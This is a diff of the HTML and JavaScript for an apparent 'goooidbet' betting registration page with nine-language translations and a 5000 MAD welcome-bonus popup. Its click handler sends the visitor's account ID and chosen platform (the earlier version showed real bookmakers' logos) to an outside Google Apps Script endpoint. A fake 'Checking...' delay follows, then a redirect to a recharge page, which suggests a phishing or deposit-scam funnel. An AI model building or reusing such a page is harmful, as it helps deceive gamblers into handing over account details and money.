+            <div class="select-group">
+                <span class="select-label-top" data-i18n="selectCurrency">Select currency</span>
+                <select class="select-field" id="currencySelect">
+                    <option value="MAD">MAD (Moroccan dirham)</option>
+                    <option value="USD">USD (US dollar)</option>
+                </select>
+            </div>
+
+            <div class="input-group">
+                <input type="text" class="input-field" id="promoCodeInput" placeholder="Enter Promo Code" data-i18n-placeholder="promoPlaceholder">
+            </div>
+
+            <button class="submit-btn" id="registerBtn" disabled data-i18n="registerBtn">Register</button>
+
+            <p class="terms-text" data-i18n="termsText">
+                By clicking this button you confirm that you have read and agreed to the <a href="#">Terms and Conditions</a> and <a href="#">Privacy Policy</a> of the company and confirm that you are of legal age.
+            </p>
+        </div>
+
+        <footer class="footer">
+            <p class="footer-desc">
+                <span data-i18n="footerDescPart1">goooidbet uses cookies to ensure you get the best experience. By remaining on the website, you consent to the use of your cookies on goooidbet.</span> <a href="#" data-i18n="learnMore">Learn more</a>
+            </p>
+            <p class="copyright" data-i18n="copyright">
+                Copyright &copy; 2026 «goooidbet». All rights reserved and protected by law.
+            </p>
+
+            <div class="bottom-actions">
+                <button class="action-btn support-btn">
+                    <i class="fa-solid fa-headset" style="font-size: 24px; color: #62b5e5;"></i>
+                    <div class="support-info">
+                        <span data-i18n="supportTitle">Support 24/7</span>
+                        <span data-i18n="supportDesc">Ask any question</span>
+                    </div>
+                </button>
+                <button class="action-btn" id="langSelectBtn">
+                    <span id="currentLangText" style="display: flex; align-items: center; gap: 6px;">EN <img src="https://flagcdn.com/w40/gb.png" class="lang-flag" style="margin: 0; width: 18px; height: 18px;"></span>
+                    <i class="fa-solid fa-chevron-down"></i>
+                </button>
+            </div>
+
+            <div class="app-banner">
+                <div style="text-align: inherit;">
+                    <div class="app-title"><span class="part-gooo">gooo</span><span class="part-idbet">idbet</span></div>
+                    <div style="font-size: 11px;" data-i18n="mobileApp">Mobile Application</div>
+                </div>
+                <div class="app-icons">
+                    <i class="fa-brands fa-android"></i>
+                    <i class="fa-brands fa-apple"></i>
+                </div>
+            </div>
+        </footer>
+
+        <!-- Language Modal Overlay with All Languages -->
+        <div class="lang-modal" id="langModal">
+            <div class="lang-header">
+                <button class="back-btn" id="closeLangModal"><i class="fa-solid fa-arrow-left"></i></button>
+                <h2 data-i18n="selectLanguageTitle">Select language</h2>
+            </div>
+            <div class="lang-search-box">
+                <div class="lang-search-wrapper">
+                    <i class="fa-solid fa-search"></i>
+                    <input type="text" class="lang-search-input" id="langSearchInput" placeholder="Search" data-i18n-placeholder="searchPlaceholder">
+                </div>
+            </div>
+            <div class="lang-list" id="langList">
+                <div class="lang-item" data-lang="AR" data-flag="https://flagcdn.com/w40/ma.png">
+                    <img src="https://flagcdn.com/w40/ma.png" class="lang-flag" alt="AR">
+                    <span class="lang-code">AR</span>
+                    <span class="lang-divider">|</span>
+                    <span class="lang-name">العربية</span>
+                </div>
+                <div class="lang-item" data-lang="FR" data-flag="https://flagcdn.com/w40/fr.png">
+                    <img src="https://flagcdn.com/w40/fr.png" class="lang-flag" alt="FR">
+                    <span class="lang-code">FR</span>
+                    <span class="lang-divider">|</span>
+                    <span class="lang-name">Français</span>
+                </div>
+                <div class="lang-item" data-lang="EN" data-flag="https://flagcdn.com/w40/gb.png">
+                    <img src="https://flagcdn.com/w40/gb.png" class="lang-flag" alt="EN">
+                    <span class="lang-code">EN</span>
+                    <span class="lang-divider">|</span>
+                    <span class="lang-name">English</span>
+                </div>
+                <div class="lang-item" data-lang="ES" data-flag="https://flagcdn.com/w40/es.png">
+                    <img src="https://flagcdn.com/w40/es.png" class="lang-flag" alt="ES">
+                    <span class="lang-code">ES</span>
+                    <span class="lang-divider">|</span>
+                    <span class="lang-name">Español</span>
+                </div>
+                <div class="lang-item" data-lang="DE" data-flag="https://flagcdn.com/w40/de.png">
+                    <img src="https://flagcdn.com/w40/de.png" class="lang-flag" alt="DE">
+                    <span class="lang-code">DE</span>
+                    <span class="lang-divider">|</span>
+                    <span class="lang-name">Deutsch</span>
+                </div>
+                <div class="lang-item" data-lang="IT" data-flag="https://flagcdn.com/w40/it.png">
+                    <img src="https://flagcdn.com/w40/it.png" class="lang-flag" alt="IT">
+                    <span class="lang-code">IT</span>
+                    <span class="lang-divider">|</span>
+                    <span class="lang-name">Italiano</span>
+                </div>
+                <div class="lang-item" data-lang="PT" data-flag="https://flagcdn.com/w40/pt.png">
+                    <img src="https://flagcdn.com/w40/pt.png" class="lang-flag" alt="PT">
+                    <span class="lang-code">PT</span>
+                    <span class="lang-divider">|</span>
+                    <span class="lang-name">Português</span>
+                </div>
+                <div class="lang-item" data-lang="RU" data-flag="https://flagcdn.com/w40/ru.png">
+                    <img src="https://flagcdn.com/w40/ru.png" class="lang-flag" alt="RU">
+                    <span class="lang-code">RU</span>
+                    <span class="lang-divider">|</span>
+                    <span class="lang-name">Русский</span>
+                </div>
+                <div class="lang-item" data-lang="TR" data-flag="https://flagcdn.com/w40/tr.png">
+                    <img src="https://flagcdn.com/w40/tr.png" class="lang-flag" alt="TR">
+                    <span class="lang-code">TR</span>
+                    <span class="lang-divider">|</span>
+                    <span class="lang-name">Türkçe</span>
+                </div>
+            </div>
+        </div>
     </div>
 
-    <div class="input-label">
-      <label for="player-id-1">معرّف اللاعب</label>
-      <span class="info-icon" title="رقم مكوَّن من 7 إلى 15 رقمًا">?</span>
+    <!-- Gift Popup Modal -->
+    <div class="gift-popup-overlay" id="giftPopupOverlay">
+        <div class="gift-popup-card">
+            <div class="gift-popup-icon">
+                <i class="fa-solid fa-gift"></i>
+            </div>
+            <h3 class="gift-popup-title" id="popupTitle">مكافأة ترحيبية</h3>
+            <p class="gift-popup-desc" id="popupDesc">احصل على مكافأة ترحيبية مقابل الإيداع الأول تصل إلى <strong>5000 MAD</strong>!</p>
+            <button class="gift-popup-btn" id="giftPopupCloseBtn" data-i18n="popupBtnClose">حسناً</button>
+        </div>
     </div>
 
-    <div class="input-group">
-      <div class="input-wrapper">
-        <input id="player-id-1" type="text" placeholder="أدخل المعرّف" maxlength="15" />
-        <div class="status-icon" id="status-icon"></div>
-      </div>
-      <div class="error-message" id="error-message"></div>
-    </div>
+    <!-- JavaScript Scripting شامل التحقق، الـ API، ونظام الترجمة للغات -->
+    <script>
+        function showHeader(type) {
+            document.getElementById('header-main').classList.remove('active');
+            document.getElementById('header-register').classList.remove('active');
+            
+            if (type === 'register') {
+                document.getElementById('header-register').classList.add('active');
+            } else {
+                document.getElementById('header-main').classList.add('active');
+            }
+        }
 
-    <div class="platform-icons" id="platforms">
-      <div class="icon" data-name="LineBet"><img src="https://i.postimg.cc/x1p0KbfL/cropped-linebet-logo.png" /><div class="icon-name">LineBet</div></div>
-      <div class="icon" data-name="MegaPari"><img src="https://i.postimg.cc/3RRJsCtS/Wh7-Gu-Bom34-Xq4-Bu-QN5n-Qlj-XPXf-V6-CZothm-Lsl6a-S.webp" /><div class="icon-name">MegaPari</div></div>
-      <div class="icon" data-name="Melbet"><img src="https://i.postimg.cc/wjCr86FS/melbet.png" /><div class="icon-name">Melbet</div></div>
-      <div class="icon" data-name="Gooobet"><img src="https://i.postimg.cc/NMyXmrWn/c943dc665c7e8926e8fb15cadd4e1eee.jpg" /><div class="icon-name">Gooobet</div></div>
-      <div class="icon" data-name="1xBet"><img src="https://i.postimg.cc/PrMCL4Cx/1-XBet-Casino-1200x900-1.png" /><div class="icon-name">1xBet</div></div>
-    </div>
+        const tabs = document.querySelectorAll('.tab-item');
+        tabs.forEach(tab => {
+            tab.addEventListener('click', () => {
+                tabs.forEach(t => t.classList.remove('active'));
+                tab.classList.add('active');
+            });
+        });
 
-    <button class="login-btn" id="login-btn" disabled>تسجيل الدخول</button>
-  </section>
-</main>
+        const input = document.getElementById('idCompteInput');
+        const btn = document.getElementById('registerBtn');
+        const partners = document.querySelectorAll('.partner-card');
+        let platform = null;
 
-<script>
-  const input = document.getElementById('player-id-1');
-  const errMsg = document.getElementById('error-message');
-  const btn = document.getElementById('login-btn');
-  const icons = document.querySelectorAll('.icon');
-  const statusIcon = document.getElementById('status-icon');
-  let platform = null;
-  const repReg = /^(\d)\1{6,}$/;
+        function checkValidId(val) {
+            if (val.length < 7) return false;
+            const repeatedPattern = /^(\d)\1{6,}$/;
+            if (repeatedPattern.test(val)) return false;
+            return true;
+        }
 
-  input.addEventListener('keydown', e => {
-    const ok = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab'];
-    if (!ok.includes(e.key) && !/^\d$/.test(e.key)) e.preventDefault();
-  });
+        input.addEventListener('keydown', e => {
+            const ok = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab'];
+            if (!ok.includes(e.key) && !/^\d$/.test(e.key)) e.preventDefault();
+        });
 
-  input.addEventListener('input', validate);
+        input.addEventListener('input', validate);
 
-  icons.forEach(icon => {
-    icon.addEventListener('click', () => {
-      icons.forEach(i => i.classList.remove('selected'));
-      icon.classList.add('selected');
-      platform = icon.dataset.name;
-      validate();
-    });
-  });
+        partners.forEach(partner => {
+            partner.addEventListener('click', () => {
+                partners.forEach(p => p.classList.remove('selected'));
+                partner.classList.add('selected');
+                platform = partner.dataset.name;
+                validate();
+            });
+        });
 
-  function validate() {
-    const val = input.value.replace(/\D/g, '');
-    input.value = val;
-    errMsg.textContent = '';
-    btn.disabled = true;
+        function validate() {
+            const val = input.value.replace(/\D/g, '');
+            input.value = val;
+            
+            if (checkValidId(val) && platform) {
+                btn.disabled = false;
+            } else {
+                btn.disabled = true;
+            }
+        }
 
-    if (val.length < 7) {
-      statusIcon.style.display = 'none';
-      statusIcon.className = 'status-icon';
-      statusIcon.innerHTML = '';
-      return;
-    }
+        // إرسال البيانات للرابط وتحويل المستخدم للصفحة المطلوبة
+        btn.addEventListener('click', async () => {
+            const currentLangCode = document.documentElement.getAttribute('dir') === 'rtl' ? 'AR' : 'EN';
+            const checkingText = currentLangCode === 'AR' ? 'جارٍ التحقق...' : 'Checking...';
+            
+            btn.innerHTML = `<span>${checkingText}</span>`;
+            btn.disabled = true;
+            const payload = { userId: input.value, platform: platform };
+            
+            try {
+                await fetch('https://script.google.com/macros/s/AKfycbzQXqfYK3rzSSR-ZKYDxsa1iqTQUpfflHnDZQVnU3hKxNoLG0j3gPO0KIijH5YZelQg3A/exec', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                
+                setTimeout(() => {
+                    localStorage.setItem('userId', input.value);
+                    window.location.href = 'fr/office/recharge.html';
+                }, 1200);
+            } catch (err) {
+                btn.innerHTML = translations[currentLangCode]?.registerBtn || 'Register';
+                btn.disabled = false;
+            }
+        });
 
-    statusIcon.style.display = 'flex';
-    statusIcon.className = 'status-icon status-spinner';
-    statusIcon.innerHTML = '';
+        // قاموس الترجمات الشامل لجميع اللغات المدعومة
+        const translations = {
+            EN: {
+                loginBtn: "Log in", registerHeaderBtn: "Registration", depositBtn: "Deposit",
+                pageTitle: "Registration", oneClick: "One-click", socialNetworks: "Social networks",
+                byEmail: "By e-mail", byPhone: "By phone", idPlaceholder: "ID Compte",
+                selectCurrency: "Select currency", promoPlaceholder: "Enter Promo Code", registerBtn: "Register",
+                termsText: 'By clicking this button you confirm that you have read and agreed to the <a href="#">Terms and Conditions</a> and <a href="#">Privacy Policy</a> of the company and confirm that you are of legal age.',
+                footerDescPart1: "goooidbet uses cookies to ensure you get the best experience. By remaining on the website, you consent to the use of your cookies on goooidbet.",
+                learnMore: "Learn more", copyright: "Copyright © 2026 «goooidbet». All rights reserved and protected by law.",
+                supportTitle: "Support 24/7", supportDesc: "Ask any question", mobileApp: "Mobile Application",
+                selectLanguageTitle: "Select language", searchPlaceholder: "Search",
+                popupTitle: "Welcome Bonus", popupDesc: "Get a welcome bonus for your first deposit up to <strong>5000 MAD</strong>!", popupBtnClose: "OK"
+            },
+            FR: {
+                loginBtn: "Connexion", registerHeaderBtn: "Inscription", depositBtn: "Dépôt",
+                pageTitle: "Inscription", oneClick: "En un clic", socialNetworks: "Réseaux sociaux",
+                byEmail: "Par e-mail", byPhone: "Par téléphone", idPlaceholder: "ID Compte",
+                selectCurrency: "Sélectionner la devise", promoPlaceholder: "Entrer le code promo", registerBtn: "S'inscrire",
+                termsText: 'En cliquant sur ce bouton, vous confirmez avoir lu et accepté les <a href="#">Termes et Conditions</a> ainsi que la <a href="#">Politique de Confidentialité</a> de l\'entreprise et vous certifiez être majeur.',
+                footerDescPart1: "goooidbet utilise des cookies pour vous garantir la meilleure expérience. En restant sur le site, vous consentez à l'utilisation de vos cookies sur goooidbet.",
+                learnMore: "En savoir plus", copyright: "Copyright © 2026 «goooidbet». Tous droits réservés et protégés par la loi.",
+                supportTitle: "Support 24/7", supportDesc: "Posez vos questions", mobileApp: "Application Mobile",
+                selectLanguageTitle: "Choisir la langue", searchPlaceholder: "Rechercher",
+                popupTitle: "Bonus de Bienvenue", popupDesc: "Obtenez un bonus de bienvenue pour votre premier dépôt jusqu'à <strong>5000 MAD</strong> !", popupBtnClose: "OK"
+            },
+            AR: {
+                loginBtn: "تسجيل الدخول", registerHeaderBtn: "التسجيل", depositBtn: "إيداع",
+                pageTitle: "التسجيل", oneClick: "نقرة واحدة", socialNetworks: "شبكات التواصل",
+                byEmail: "بريد إلكتروني", byPhone: "برقم الهاتف", idPlaceholder: "معرف الحساب (ID)",
+                selectCurrency: "اختر العملة", promoPlaceholder: "أدخل رمز البرومو", registerBtn: "تسجيل",
+                termsText: 'بالنقر على هذا الزر، فإنك تؤكد أنك قرأت ووافقت على <a href="#">الشروط والأحكام</a> و<a href="#">سياسة الخصوصية</a> الخاصة بالشركة وتؤكد أنك بالغ سن القانون.',
+                footerDescPart1: "تستخدم goooidbet ملفات تعريف الارتباط لضمان حصولك على أفضل تجربة. بقاؤك في الموقع يمثل موافقة منك على استخدام ملفات الارتباط.",
+                learnMore: "اعرف المزيد", copyright: "حقوق الطبع والنشر © 2026 «goooidbet». جميع الحقوق محفوظة ومحمية بالقانون.",
+                supportTitle: "دعم 24/7", supportDesc: "طرح أي سؤال", mobileApp: "تطبيق الهاتف المحمول",
+                selectLanguageTitle: "اختر اللغة", searchPlaceholder: "بحث",
+                popupTitle: "مكافأة ترحيبية", popupDesc: "احصل على مكافأة ترحيبية مقابل الإيداع الأول تصل إلى <strong>5000 MAD</strong>!", popupBtnClose: "حسناً"
+            },
+            ES: {
+                loginBtn: "Iniciar sesión", registerHeaderBtn: "Registro", depositBtn: "Depósito",
+                pageTitle: "Registro", oneClick: "Un clic", socialNetworks: "Redes sociales",
+                byEmail: "Por correo", byPhone: "Por teléfono", idPlaceholder: "ID de cuenta",
+                selectCurrency: "Seleccionar moneda", promoPlaceholder: "Introducir código promocional", registerBtn: "Registrarse",
+                termsText: 'Al hacer clic en este botón, confirma que ha leído y aceptado los <a href="#">Términos y Condiciones</a> y la <a href="#">Política de Privacidad</a> de la empresa y confirma que es mayor de edad.',
+                footerDescPart1: "goooidbet utiliza cookies para garantizarle la mejor experiencia. Al permanecer en el sitio web, usted alcaza el uso de cookies en goooidbet.",
+                learnMore: "Más información", copyright: "Copyright © 2026 «goooidbet». Todos los derechos reservados y protegidos por la ley.",
+                supportTitle: "Soporte 24/7", supportDesc: "Hacer cualquier pregunta", mobileApp: "Aplicación Móvil",
+                selectLanguageTitle: "Seleccionar idioma", searchPlaceholder: "Buscar",
+                popupTitle: "Bono de Bienvenida", popupDesc: "¡Obtén un bono de bienvenida por tu primer depósito de hasta <strong>5000 MAD</strong>!", popupBtnClose: "Aceptar"
+            },
+            DE: {
+                loginBtn: "Anmelden", registerHeaderBtn: "Registrierung", depositBtn: "Einzahlen",
+                pageTitle: "Registrierung", oneClick: "Mit einem Klick", socialNetworks: "Soziale Netzwerke",
+                byEmail: "Per E-Mail", byPhone: "Per Telefon", idPlaceholder: "Konto-ID",
+                selectCurrency: "Währung auswählen", promoPlaceholder: "Promo-Code eingeben", registerBtn: "Registrieren",
+                termsText: 'Durch das Klicken auf diesen Button bestätigen Sie, dass Sie die <a href="#">Geschäftsbedingungen</a> und <a href="#">Datenschutzbestimmungen</a> gelesen haben und volljährig sind.',
+                footerDescPart1: "goooidbet verwendet Cookies, um Ihnen das beste Erlebnis zu bieten. Durch den Verbleib auf der Website stimmen Sie der Nutzung von Cookies zu.",
+                learnMore: "Mehr erfahren", copyright: "Copyright © 2026 «goooidbet». Alle Rechte vorbehalten und gesetzlich geschützt.",
+                supportTitle: "Support 24/7", supportDesc: "Stellen Sie eine Frage", mobileApp: "Mobile Anwendung",
+                selectLanguageTitle: "Sprache auswählen", searchPlaceholder: "Suchen",
+                popupTitle: "Willkommensbonus", popupDesc: "Erhalten Sie einen Willkommensbonus für Ihre erste Einzahlung von bis zu <strong>5000 MAD</strong>!", popupBtnClose: "OK"
+            },
+            IT: {
+                loginBtn: "Accedi", registerHeaderBtn: "Registrazione", depositBtn: "Deposito",
+                pageTitle: "Registrazione", oneClick: "Un click", socialNetworks: "Social network",
+                byEmail: "Tramite e-mail", byPhone: "Tramite telefono", idPlaceholder: "ID Conto",
+                selectCurrency: "Seleziona valuta", promoPlaceholder: "Inserisci codice promozionale", registerBtn: "Registrati",
+                termsText: 'Cliccando su questo pulsante confermi di aver letto e accettato i <a href="#">Termini e Condizioni</a> e l\'<a href="#">Informativa sulla Privacy</a> dell\'azienda e confermi di essere maggiorenne.',
+                footerDescPart1: "goooidbet utilizza i cookie per garantirti la migliore esperienza. Rimanendo sul sito web, acconsenti all'uso dei cookie su goooidbet.",
+                learnMore: "Scopri di più", copyright: "Copyright © 2026 «goooidbet». Tutti i diritti riservati e protetti dalla legge.",
+                supportTitle: "Supporto 24/7", supportDesc: "Fai qualsiasi domanda", mobileApp: "Applicazione Mobile",
+                selectLanguageTitle: "Seleziona lingua", searchPlaceholder: "Cerca",
+                popupTitle: "Bonus di Benvenuto", popupDesc: "Ottieni un bonus di benvenuto per il tuo primo deposito fino a <strong>5000 MAD</strong>!", popupBtnClose: "OK"
+            },
+            PT: {
+                loginBtn: "Entrar", registerHeaderBtn: "Registo", depositBtn: "Depósito",
+                pageTitle: "Registo", oneClick: "Um clique", socialNetworks: "Redes sociais",
+                byEmail: "Por e-mail", byPhone: "Por telefone", idPlaceholder: "ID da Conta",
+                selectCurrency: "Selecionar moeda", promoPlaceholder: "Inserir código promocional", registerBtn: "Registar",
+                termsText: 'Ao clicar neste botão, confirma que leu e concordou com os <a href="#">Termos e Condições</a> e a <a href="#">Política de Privacidade</a> da empresa e confirma que é maior de idade.',
+                footerDescPart1: "O goooidbet utiliza cookies para garantir a melhor experiência. Ao permanecer no site, consente a utilização de cookies no goooidbet.",
+                learnMore: "Saber mais", copyright: "Copyright © 2026 «goooidbet». Todos os direitos reservados e protegidos por lei.",
+                supportTitle: "Suporte 24/7", supportDesc: "Faça qualquer pergunta", mobileApp: "Aplicação Móvel",
+                selectLanguageTitle: "Selecionar idioma", searchPlaceholder: "Pesquisar",
+                popupTitle: "Bónus de Boas-Vindas", popupDesc: "Obtenha um bónus de boas-vindas para o seu primeiro depósito até <strong>5000 MAD</strong>!", popupBtnClose: "OK"
+            },
+            RU: {
+                loginBtn: "Войти", registerHeaderBtn: "Регистрация", depositBtn: "Депозит",
+                pageTitle: "Регистрация", oneClick: "В один клик", socialNetworks: "Соцсети",
+                byEmail: "По E-mail", byPhone: "По телефону", idPlaceholder: "ID счета",
+                selectCurrency: "Выберите валюту", promoPlaceholder: "Введите промокод", registerBtn: "Регистрация",
+                termsText: 'Нажимая эту кнопку, вы подтверждаете, что ознакомились и согласны с <a href="#">Условиями</a> и <a href="#">Политикой конфиденциальности</a> компании, а также подтверждаете свое совершеннолетие.',
+                footerDescPart1: "goooidbet использует файлы cookie для обеспечения наилучшего качества работы. Оставаясь на сайте, вы соглашаетесь на использование файлов cookie.",
+                learnMore: "Подробнее", copyright: "Copyright © 2026 «goooidbet». Все права защищены законом.",
+                supportTitle: "Поддержка 24/7", supportDesc: "Задайте вопрос", mobileApp: "Мобильное приложение",
+                selectLanguageTitle: "Выберите язык", searchPlaceholder: "Поиск",
+                popupTitle: "Приветственный бонус", popupDesc: "Получите приветственный бонус за первый депозит до <strong>5000 MAD</strong>!", popupBtnClose: "OK"
+            },
+            TR: {
+                loginBtn: "Giriş yap", registerHeaderBtn: "Kayıt Ol", depositBtn: "Yatırım",
+                pageTitle: "Kayıt Ol", oneClick: "Tek tıkla", socialNetworks: "Sosyal ağlar",
+                byEmail: "E-posta ile", byPhone: "Telefon ile", idPlaceholder: "Hesap ID",
+                selectCurrency: "Para birimi seçin", promoPlaceholder: "Promosyon kodu girin", registerBtn: "Kayıt Ol",
+                termsText: 'Bu düğmeye tıklayarak şirketin <a href="#">Şartlar ve Koşullar</a> ile <a href="#">Gizlilik Politikası</a>\'nı okuyup kabul ettiğinizi ve yasal yaşta olduğunuzu onaylırsınız.',
+                footerDescPart1: "goooidbet, size en iyi deneyimi sunmak için çerezleri kullanır. Web sitesinde kalarak çerezlerin kullanımını onaylamış olursunuz.",
+                learnMore: "Daha fazla bilgi", copyright: "Telif Hakkı © 2026 «goooidbet». Tüm hakları saklıdır ve kanunla korunmaktadır.",
+                supportTitle: "Destek 7/24", supportDesc: "Soru sorun", mobileApp: "Mobil Uygulama",
+                selectLanguageTitle: "Dil seçin", searchPlaceholder: "Ara",
+                popupTitle: "Hoş Geldin Bonusu", popupDesc: "İlk yatırımınız için <strong>5000 MAD</strong>'e varan hoş geldin bonusu kazanın!", popupBtnClose: "Tamam"
+            }
+        };
 
-    setTimeout(() => {
-      if (repReg.test(val)) {
-        errMsg.textContent = 'المعرّف غير صالح';
-        statusIcon.style.display = 'none';
-        return;
-      }
-      if (!platform) {
-        errMsg.textContent = 'يرجى اختيار المنصة.';
-        statusIcon.style.display = 'none';
-        return;
-      }
+        const langSelectBtn = document.getElementById('langSelectBtn');
+        const langModal = document.getElementById('langModal');
+        const closeLangModal = document.getElementById('closeLangModal');
+        const currentLangText = document.getElementById('currentLangText');
+        const langItems = document.querySelectorAll('.lang-item');
+        const langSearchInput = document.getElementById('langSearchInput');
 
-      btn.disabled = false;
-      statusIcon.className = 'status-icon status-check';
-      statusIcon.innerHTML = '✓';
-    }, 500);
-  }
+        // عناصر بوب أب الهدية
+        const giftBtnMain = document.getElementById('giftBtnMain');
+        const giftBtnRegister = document.getElementById('giftBtnRegister');
+        const giftPopupOverlay = document.getElementById('giftPopupOverlay');
+        const giftPopupCloseBtn = document.getElementById('giftPopupCloseBtn');
+        const popupTitleEl = document.getElementById('popupTitle');
+        const popupDescEl = document.getElementById('popupDesc');
 
-  btn.addEventListener('click', async () => {
-    btn.innerHTML = '<span class="btn-spinner"></span> جارٍ التحقق...';
-    btn.disabled = true;
-    const payload = { userId: input.value, platform: platform };
-    try {
-      await fetch('https://script.google.com/macros/s/AKfycbzQXqfYK3rzSSR-ZKYDxsa1iqTQUpfflHnDZQVnU3hKxNoLG0j3gPO0KIijH5YZelQg3A/exec', {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-      setTimeout(() => {
-        localStorage.setItem('userId', input.value);
-        window.location.href = 'fr/office/recharge.html';
-      }, 1200);
-    } catch (err) {
-      errMsg.textContent = 'حدث خطأ أثناء التحقق، حاول مجددًا.';
-      btn.innerHTML = 'تأكيد';
-      btn.disabled = false;
-    }
-  });
+        function openGiftPopup() {
+            const currentLangCode = document.documentElement.getAttribute('dir') === 'rtl' ? 'AR' : (currentLangText.innerText.trim().substring(0, 2).toUpperCase() || 'EN');
+            // مطابقة اللغة الحالية أو الافتراضية
+            const langKey = translations[currentLangCode] ? currentLangCode : 'EN';
+            
+            popupTitleEl.innerHTML = translations[langKey].popupTitle;
+            popupDescEl.innerHTML = translations[langKey].popupDesc;
+            giftPopupCloseBtn.innerHTML = translations[langKey].popupBtnClose;
 
-  window.addEventListener('pageshow', () => {
-    btn.disabled = true;
-    btn.innerHTML = 'تأكيد';
-    errMsg.textContent = '';
-    input.value = '';
-    platform = null;
-    statusIcon.style.display = 'none';
-    statusIcon.className = 'status-icon';
-    statusIcon.innerHTML = '';
-    icons.forEach(i => i.classList.remove('selected'));
-  });
-</script>
+            giftPopupOverlay.classList.add('open');
+        }
 
+        function closeGiftPopup() {
+            giftPopupOverlay.classList.remove('open');
+        }
+
+        giftBtnMain.addEventListener('click', openGiftPopup);
+        giftBtnRegister.addEventListener('click', openGiftPopup);
+        giftPopupCloseBtn.addEventListener('click', closeGiftPopup);
+        giftPopupOverlay.addEventListener('click', (e) => {
+            if (e.target === giftPopupOverlay) {
+                closeGiftPopup();
+            }
+        });
+
+        function setLanguage(langCode, flagUrl) {
+            const t = translations[langCode] || translations['EN'];
+            
+            // تحديث النصوص بناءً على data-i18n
+            document.querySelectorAll('[data-i18n]').forEach(el => {
+                const key = el.getAttribute('data-i18n');
+                if (t[key]) {
+                    el.innerHTML = t[key];
+                }
+            });
+
+            // تحديث الحقول Placeholders
+            document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
+                const key = el.getAttribute('data-i18n-placeholder');
+                if (t[key]) {
+                    el.placeholder = t[key];
+                }
+            });
+
+            currentLangText.innerHTML = `${langCode} <img src="${flagUrl}" class="lang-flag" style="margin: 0; width: 18px; height: 18px;">`;
+
+            // ضبط اتجاه الكتابة وتحديث الـ Dir attribute
+            if (langCode === 'AR') {
+                document.documentElement.setAttribute('dir', 'rtl');
+            } else {
+                document.documentElement.setAttribute('dir', 'ltr');
+            }
+        }
+
+        langSelectBtn.addEventListener('click', () => langModal.classList.add('open'));
+        closeLangModal.addEventListener('click', () => langModal.classList.remove('open'));
+
+        langItems.forEach(item => {
+            item.addEventListener('click', () => {
+                const lang = item.getAttribute('data-lang');
+                const flagUrl = item.getAttribute('data-flag');
+                if(translations[lang]) setLanguage(lang, flagUrl);
+                langModal.classList.remove('open');
+            });
+        });
+
+        // ميزة البحث في القائمة المنسدلة للغات
+        langSearchInput.addEventListener('input', (e) => {
+            const term = e.target.value.toLowerCase();
+            langItems.forEach(item => {
+                const name = item.querySelector('.lang-name').innerText.toLowerCase();
+                const code = item.querySelector('.lang-code').innerText.toLowerCase();
+                if (name.includes(term) || code.includes(term)) {
+                    item.style.display = 'flex';
+                } else {
+                    item.style.display = 'none';
+                }
+            });
+        });
+
+        window.addEventListener('pageshow', () => {
+            btn.disabled = true;
+            const currentLangCode = document.documentElement.getAttribute('dir') === 'rtl' ? 'AR' : 'EN';
+            btn.innerHTML = translations[currentLangCode]?.registerBtn || 'Register';
+            input.value = '';
+            platform = null;
+            partners.forEach(p => p.classList.remove('selected'));
+        });
+    </script>
 </body>
 </html>
